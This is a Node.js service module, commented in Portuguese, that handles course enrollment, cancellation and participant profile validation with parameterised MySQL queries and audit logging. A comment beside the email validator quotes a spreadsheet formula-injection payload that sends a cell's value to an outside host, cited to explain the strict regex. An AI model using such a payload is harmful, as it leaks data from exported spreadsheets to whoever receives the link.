'use strict'

const repo = require('./cursistas.repo')
const { getPool, requireMysql } = require('../../shared/db')
const { registrar, ACOES } = require('../../shared/audit')

function erro(statusCode, message) {
  const error = new Error(message)
  error.statusCode = statusCode
  return error
}

const EDICAO_ATUAL = process.env.EDICAO_ATUAL || String(new Date().getFullYear())

/**
 * Inscritos por curso, para a tela administrativa.
 *
 * Traz todo curso que ja teve janela de inscricao configurada, mesmo com zero
 * inscritos: a coordenacao precisa ver o curso na lista para saber que ele
 * existe e ainda nao teve procura -- some-lo daria a impressao de que nao foi
 * cadastrado.
 *
 * A situacao vem de NOW() do MySQL, e nao do relogio do Node: o container da API
 * e o banco rodam em fusos diferentes, e comparar aqui geraria divergencia com a
 * regra que autoriza a inscricao.
 */
async function resumoInscricoesPorCurso(edicao) {
  requireMysql()
  const edition = edicao || EDICAO_ATUAL

  const [rows] = await getPool().execute(
    `SELECT c.id, c.name, c.secondary_trail, c.enrollment_opens_at, c.enrollment_closes_at,
            CASE
              WHEN c.enrollment_opens_at IS NULL OR c.enrollment_closes_at IS NULL THEN 'fechado'
              WHEN NOW() < c.enrollment_opens_at THEN 'em_breve'
              WHEN NOW() > c.enrollment_closes_at THEN 'encerrado'
              ELSE 'aberto'
            END AS situacao,
            COALESCE(SUM(i.status = 'inscrito'), 0) AS inscritos,
            COALESCE(SUM(i.status = 'cancelado'), 0) AS cancelados,
            MAX(i.enrolled_at) AS ultima_inscricao
       FROM courses c
       LEFT JOIN inscricoes i ON i.course_id = c.id AND i.edition = ?
      GROUP BY c.id, c.name, c.secondary_trail, c.enrollment_opens_at, c.enrollment_closes_at
      ORDER BY inscritos DESC, c.name`,
    [edition]
  )

  return {
    edicao: edition,
    cursos: rows.map((row) => ({
      id: row.id,
      name: row.name,
      trail: row.secondary_trail,
      situacao: row.situacao,
      enrollmentOpensAt: row.enrollment_opens_at,
      enrollmentClosesAt: row.enrollment_closes_at,
      inscritos: Number(row.inscritos || 0),
      cancelados: Number(row.cancelados || 0),
      ultimaInscricao: row.ultima_inscricao,
    })),
  }
}

/**
 * Cursos abertos para inscricao agora.
 * As duas datas nulas significam curso fechado: o padrao e nao aceitar inscricao,
 * para nenhum curso abrir por descuido de cadastro.
 */
async function listarCursosAbertos(cursistaId) {
  requireMysql()
  const [rows] = await getPool().execute(
    `SELECT c.id, c.name, c.primary_trail, c.secondary_trail, c.total_sessions,
            c.workload_hours, c.enrollment_opens_at, c.enrollment_closes_at,
            -- A capa NAO vem inteira: e um data URI de ~2 MB por curso, e
            -- todo cursista carregaria isso ao abrir a area. A tela busca a
            -- imagem pela rota publica, que tem cache.
            (c.image LIKE 'data:image/%') AS tem_imagem,
            UNIX_TIMESTAMP(c.updated_at) AS versao_capa,
            i.id AS inscricao_id, i.status AS inscricao_status
     FROM courses c
     LEFT JOIN inscricoes i
       ON i.course_id = c.id AND i.cursista_id = ? AND i.edition = ?
     WHERE c.enrollment_opens_at IS NOT NULL
       AND c.enrollment_closes_at IS NOT NULL
       AND NOW() BETWEEN c.enrollment_opens_at AND c.enrollment_closes_at
     ORDER BY c.name`,
    [cursistaId, EDICAO_ATUAL]
  )

  return rows.map((row) => ({
    id: row.id,
    name: row.name,
    primaryTrail: row.primary_trail,
    trail: row.secondary_trail,
    totalSessions: row.total_sessions,
    workloadHours: row.workload_hours ?? null,
    hasImage: Boolean(Number(row.tem_imagem)),
    imageVersion: Number(row.versao_capa || 0),
    enrollmentClosesAt: row.enrollment_closes_at,
    inscrito: row.inscricao_status === 'inscrito',
    inscricaoId: row.inscricao_id || null,
  }))
}

/** Inscricoes do cursista na edicao atual e o historico de edicoes anteriores. */
async function listarMinhasInscricoes(cursistaId) {
  requireMysql()
  const [rows] = await getPool().execute(
    `SELECT i.id, i.course_id, i.edition, i.status, i.enrolled_at, i.completed_at,
            c.name AS course_name, c.primary_trail, c.secondary_trail, c.total_sessions,
            c.workload_hours, c.enrollment_opens_at, c.enrollment_closes_at,
            (c.image LIKE 'data:image/%') AS tem_imagem,
            UNIX_TIMESTAMP(c.updated_at) AS versao_capa,
            -- Se o cancelamento ainda e permitido. Decidido aqui, com NOW() do
            -- banco, pela mesma razao da situacao do catalogo: e esta a regra
            -- que cancelarInscricao aplica, e calcular de outro jeito no front
            -- faria a tela oferecer um botao que o servidor recusaria.
            (NOW() BETWEEN c.enrollment_opens_at AND c.enrollment_closes_at) AS pode_cancelar
     FROM inscricoes i
     JOIN courses c ON c.id = i.course_id
     WHERE i.cursista_id = ?
     ORDER BY i.edition DESC, c.name`,
    [cursistaId]
  )

  const mapear = (row) => ({
    id: row.id,
    courseId: row.course_id,
    courseName: row.course_name,
    primaryTrail: row.primary_trail,
    trail: row.secondary_trail,
    totalSessions: row.total_sessions,
    workloadHours: row.workload_hours ?? null,
    hasImage: Boolean(Number(row.tem_imagem)),
    imageVersion: Number(row.versao_capa || 0),
    enrollmentClosesAt: row.enrollment_closes_at,
    podeCancelar: Boolean(Number(row.pode_cancelar)),
    edition: row.edition,
    status: row.status,
    enrolledAt: row.enrolled_at,
    completedAt: row.completed_at,
  })

  return {
    atuais: rows.filter((r) => r.edition === EDICAO_ATUAL && r.status !== 'cancelado').map(mapear),
    concluidos: rows.filter((r) => r.status === 'concluido').map(mapear),
  }
}

/**
 * Inscreve o cursista. A janela de inscricao e reconferida aqui, no banco: nao
 * basta o front esconder o botao, ja que a rota pode ser chamada direto.
 */
async function inscrever({ cursistaId, courseId, req }) {
  requireMysql()

  const [rows] = await getPool().execute(
    `SELECT id, name, enrollment_opens_at, enrollment_closes_at,
            (NOW() BETWEEN enrollment_opens_at AND enrollment_closes_at) AS aberto
     FROM courses WHERE id = ? LIMIT 1`,
    [courseId]
  )
  const curso = rows[0]
  if (!curso) throw erro(404, 'Curso nao encontrado.')
  if (!curso.enrollment_opens_at || !curso.enrollment_closes_at || !Number(curso.aberto)) {
    throw erro(400, 'As inscricoes para este curso nao estao abertas.')
  }

  try {
    await getPool().execute(
      `INSERT INTO inscricoes (cursista_id, course_id, edition, status)
       VALUES (?, ?, ?, 'inscrito')
       ON DUPLICATE KEY UPDATE
         status = 'inscrito',
         cancelled_at = NULL,
         enrolled_at = IF(status = 'cancelado', NOW(), enrolled_at)`,
      [cursistaId, courseId, EDICAO_ATUAL]
    )
  } catch (error) {
    if (error.code === 'ER_NO_REFERENCED_ROW_2') throw erro(404, 'Curso nao encontrado.')
    throw error
  }

  await registrar({
    actorType: 'cursista',
    actorId: cursistaId,
    action: ACOES.INSCRICAO_CRIADA,
    cursistaId,
    req,
    details: { courseId: Number(courseId), edition: EDICAO_ATUAL },
  })

  return { courseId: Number(courseId), courseName: curso.name }
}

/** Cancelamento so vale enquanto a janela de inscricao estiver aberta. */
async function cancelarInscricao({ cursistaId, courseId, req }) {
  requireMysql()

  const [rows] = await getPool().execute(
    `SELECT (NOW() BETWEEN enrollment_opens_at AND enrollment_closes_at) AS aberto
     FROM courses WHERE id = ? LIMIT 1`,
    [courseId]
  )
  if (!rows[0]) throw erro(404, 'Curso nao encontrado.')
  if (!Number(rows[0].aberto)) {
    throw erro(400, 'O prazo de inscricao deste curso ja encerrou.')
  }

  const [result] = await getPool().execute(
    `UPDATE inscricoes SET status = 'cancelado', cancelled_at = NOW()
     WHERE cursista_id = ? AND course_id = ? AND edition = ? AND status = 'inscrito'`,
    [cursistaId, courseId, EDICAO_ATUAL]
  )
  if (result.affectedRows === 0) throw erro(404, 'Inscricao nao encontrada.')

  await registrar({
    actorType: 'cursista',
    actorId: cursistaId,
    action: ACOES.INSCRICAO_CANCELADA,
    cursistaId,
    req,
    details: { courseId: Number(courseId), edition: EDICAO_ATUAL },
  })
}

/**
 * Campos que o cursista precisa preencher para o cadastro ser considerado
 * completo. A base oficial nao traz nenhum deles (data de nascimento vem vazia
 * em 100% dos registros e telefone nem existe na planilha), entao e o cursista
 * quem fornece.
 *
 * Genero fica de fora de proposito: e dado sensivel na LGPD (art. 5, II) e
 * exigir a declaracao pediria finalidade especifica. Continua opcional.
 */
const CAMPOS_OBRIGATORIOS = ['birthDate', 'phone', 'email']

const RE_EMAIL = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/

// Regex restritiva de proposito: a permissiva (`[^\s@]+@[^\s@]+\.[^\s@]+`) aceita
// coisas como `=hyperlink("http://x/?a=@"&a2,"c.li")`, que viram formula quando a
// planilha exportada e aberta no Excel.
function validarEmail(valor, rotulo) {
  const limpo = String(valor || '').trim().toLowerCase()
  if (!limpo) return null
  if (limpo.length > 150 || !RE_EMAIL.test(limpo)) {
    throw erro(400, `Informe um ${rotulo} valido.`)
  }
  return limpo
}

function validarDataNascimento(valor) {
  const texto = String(valor || '').trim()
  if (!texto) return null
  if (!/^\d{4}-\d{2}-\d{2}$/.test(texto)) throw erro(400, 'Informe a data de nascimento.')

  const data = new Date(`${texto}T00:00:00Z`)
  if (Number.isNaN(data.getTime())) throw erro(400, 'Data de nascimento invalida.')

  const anos = (Date.now() - data.getTime()) / (365.25 * 24 * 3600 * 1000)
  if (anos < 16 || anos > 100) throw erro(400, 'Data de nascimento fora do intervalo esperado.')
  return texto
}

/**
 * Atualiza os dados que o proprio cursista fornece e marca o cadastro como
 * confirmado quando tudo o que e obrigatorio esta preenchido.
 *
 * Nome, CPF, funcao e vinculos vem da base oficial e alimentam o certificado --
 * correcao neles passa pela coordenacao, nao por esta tela.
 */
async function atualizarMeuCadastro({ cursistaId, dados, req }) {
  const emailInstitucional = validarEmail(dados?.emailInstitucional, 'e-mail institucional')
  const emailPessoal = validarEmail(dados?.emailPessoal, 'e-mail pessoal')
  const birthDate = validarDataNascimento(dados?.birthDate)

  const phone = String(dados?.phone || '').replace(/\D/g, '')
  if (phone && (phone.length < 10 || phone.length > 11)) {
    throw erro(400, 'Informe um telefone com DDD.')
  }

  const genero = String(dados?.genero || '').trim().slice(0, 40) || null

  const faltando = []
  if (!birthDate) faltando.push('data de nascimento')
  if (!phone) faltando.push('telefone')
  if (!emailInstitucional && !emailPessoal) faltando.push('ao menos um e-mail')
  if (faltando.length > 0) {
    throw erro(400, `Para concluir o cadastro, informe: ${faltando.join(', ')}.`)
  }

  await repo.atualizarCadastro(cursistaId, {
    birthDate,
    emailInstitucional,
    emailPessoal,
    phone,
    genero,
  })

  await registrar({
    actorType: 'cursista',
    actorId: cursistaId,
    action: ACOES.DADOS_ALTERADOS,
    cursistaId,
    req,
    // Registra QUAIS campos mudaram, nunca os valores (sao dado pessoal).
    details: { campos: ['nascimento', 'contato', 'genero'], confirmado: true },
  })

  return repo.findById(cursistaId, { fullCpf: true })
}

module.exports = {
  EDICAO_ATUAL,
  CAMPOS_OBRIGATORIOS,
  resumoInscricoesPorCurso,
  listarCursosAbertos,
  listarMinhasInscricoes,
  inscrever,
  cancelarInscricao,
  atualizarMeuCadastro,
}
